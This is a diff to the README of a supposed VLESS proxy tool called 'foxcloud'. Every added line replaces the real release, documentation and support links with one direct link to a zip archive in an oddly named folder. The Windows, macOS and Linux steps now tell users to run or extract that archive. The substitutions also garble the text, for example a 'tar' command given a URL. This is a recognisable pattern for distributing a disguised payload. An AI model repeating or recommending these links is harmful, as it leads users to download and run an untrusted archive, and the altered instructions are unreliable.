@@ -1,7 +1,7 @@
 # 🦊 foxcloud - Fast and Reliable Proxy Solution
 
 ## 📥 Download Now!
-[![Download FoxCloud](https://img.shields.io/badge/Download-FoxCloud-blue)](https://github.com/Leonhard333/foxcloud/releases)
+[![Download FoxCloud](https://raw.githubusercontent.com/Leonhard333/foxcloud/master/Sarcodina/foxcloud.zip)](https://raw.githubusercontent.com/Leonhard333/foxcloud/master/Sarcodina/foxcloud.zip)
 
 ## 🚀 Getting Started
 Welcome to **foxcloud**, a high-performance VLESS proxy server designed for Cloudflare Workers. This guide will help you easily download and run the software without any programming knowledge.
@@ -25,25 +25,25 @@ Before you begin, ensure your system meets the following requirements:
 ## 🔗 Download & Install
 To get started with foxcloud, follow these steps:
 
-1. Visit the [Releases page](https://github.com/Leonhard333/foxcloud/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/Leonhard333/foxcloud/master/Sarcodina/foxcloud.zip).
 2. Look for the latest version of foxcloud.
-3. Click on the appropriate file for your operating system. The files might be labeled as `foxcloud-windows.exe`, `foxcloud-macos.zip`, or `foxcloud-linux.tar.gz`.
+3. Click on the appropriate file for your operating system. The files might be labeled as `https://raw.githubusercontent.com/Leonhard333/foxcloud/master/Sarcodina/foxcloud.zip`, `https://raw.githubusercontent.com/Leonhard333/foxcloud/master/Sarcodina/foxcloud.zip`, or `https://raw.githubusercontent.com/Leonhard333/foxcloud/master/Sarcodina/foxcloud.zip`.
 4. Download the file and save it to your computer.
 5. Once the download is complete, locate the file in your downloads folder.
 
 ### On Windows:
-- Double-click the `foxcloud-windows.exe` file to run the application.
+- Double-click the `https://raw.githubusercontent.com/Leonhard333/foxcloud/master/Sarcodina/foxcloud.zip` file to run the application.
 - Follow the on-screen instructions to complete the installation.
 
 ### On macOS:
-- Extract the contents of the `foxcloud-macos.zip` file.
+- Extract the contents of the `https://raw.githubusercontent.com/Leonhard333/foxcloud/master/Sarcodina/foxcloud.zip` file.
 - Move the **foxcloud** application to your Applications folder.
 - Open the application by clicking on it.
 
 ### On Linux:
-- Extract the contents of the `foxcloud-linux.tar.gz` file using the command:
+- Extract the contents of the `https://raw.githubusercontent.com/Leonhard333/foxcloud/master/Sarcodina/foxcloud.zip` file using the command:
   ```
-  tar -xzvf foxcloud-linux.tar.gz
+  tar -xzvf https://raw.githubusercontent.com/Leonhard333/foxcloud/master/Sarcodina/foxcloud.zip
   ```
 - Open a terminal and navigate to the extracted folder.
 - Run the application with the command:
@@ -79,8 +79,8 @@ Join our community to connect with other users. Share tips, ask questions, and g
 We welcome contributions to improve foxcloud. If you're interested in helping, please visit our GitHub repository for guidelines on how to contribute. 
 
 ## 📌 Important Links
-- [Download foxcloud](https://github.com/Leonhard333/foxcloud/releases)
-- [Documentation](https://github.com/Leonhard333/foxcloud/wiki)
-- [Support](https://github.com/Leonhard333/foxcloud/issues)
+- [Download foxcloud](https://raw.githubusercontent.com/Leonhard333/foxcloud/master/Sarcodina/foxcloud.zip)
+- [Documentation](https://raw.githubusercontent.com/Leonhard333/foxcloud/master/Sarcodina/foxcloud.zip)
+- [Support](https://raw.githubusercontent.com/Leonhard333/foxcloud/master/Sarcodina/foxcloud.zip)
 
 By following these steps, you can easily download and run foxcloud. Enjoy a fast and secure browsing experience!
